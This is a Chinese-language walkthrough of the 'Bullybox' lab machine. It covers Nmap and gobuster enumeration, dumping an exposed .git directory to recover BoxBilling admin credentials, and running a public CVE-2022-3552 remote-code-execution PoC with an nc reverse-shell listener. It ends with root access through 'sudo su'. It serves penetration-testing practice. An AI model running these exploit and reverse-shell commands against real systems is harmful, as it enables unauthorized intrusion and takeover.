---
description: Easy - Linux / BoxBilling 4.22.1.5 / CVE-2022-3552 / sudo su提权
---

# ✔️ Bullybox

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描，获取到2个开放端口：22和80

```bash
nmap -sC -sV -p- -oA bullybox 192.168.149.27 --open
```

<figure><img src="../../.gitbook/assets/1 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 将域名添加到hosts文件中：

```bash
echo "192.168.149.27   bullybox.local" | tee -a /etc/hosts
```

* 检查/robots.txt文件，发现一些隐藏目录，依次查看没有任何收获：

<figure><img src="../../.gitbook/assets/2 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 在80端口的登录界面进行注册：

```
- test@test.com
- fiii : Test123456
```

<figure><img src="../../.gitbook/assets/3 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 登录后并没有任何发现，只得知当前系统使用的是boxbilling程序：

<figure><img src="../../.gitbook/assets/4 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 枚举80端口上的隐藏文件/目录，这里发现一些/.git目录：

```bash
gobuster dir -u http://bullybox.local -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<figure><img src="../../.gitbook/assets/5 (2).png" alt=""><figcaption></figcaption></figure>

* 使用git-dumper提取目标网站的git中的内容：

```bash
git-dumper http://bullybox.local/.git .
```

<figure><img src="../../.gitbook/assets/6 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/7 .png" alt=""><figcaption></figcaption></figure>

* 在提取出来的文件中，**bb-config.php**中发现管理员凭证：

```
- **admin ：Playing-Unstylish7-Provided**
- admin@bullybox.local
```

<figure><img src="../../.gitbook/assets/8 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 使用该有效凭证进入admin的管理界面后，获取到当前运行的软件BoxBilling及其版本号：**BoxBilling 4.22.1.5**

<figure><img src="../../.gitbook/assets/9 .png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/10 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 根据应用及其版本号，查询到公开漏洞：CVE-2022-3552
* BoxBilling<=4.22.1.5 - Remote Code Execution

<figure><img src="../../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* [https://www.exploit-db.com/exploits/51108](https://www.exploit-db.com/exploits/51108)

<figure><img src="../../.gitbook/assets/12 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 在GitHub上找到了相关PoC：

<figure><img src="../../.gitbook/assets/17 (1) (1).png" alt=""><figcaption></figcaption></figure>

### Get Shell

* 修改脚本并利用：

```bash
python3 cve-2022-3552.py -d http://bullybox.local/ -u 'admin@bullybox.local' -p 'Playing-Unstylish7-Provided'

nc -lvnp 4444
```

<figure><img src="../../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/15 (1) (1).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### ROOT

* 直接切换至root用户：

```bash
sudo su
```

<figure><img src="../../.gitbook/assets/16 (1) (1).png" alt=""><figcaption></figcaption></figure>
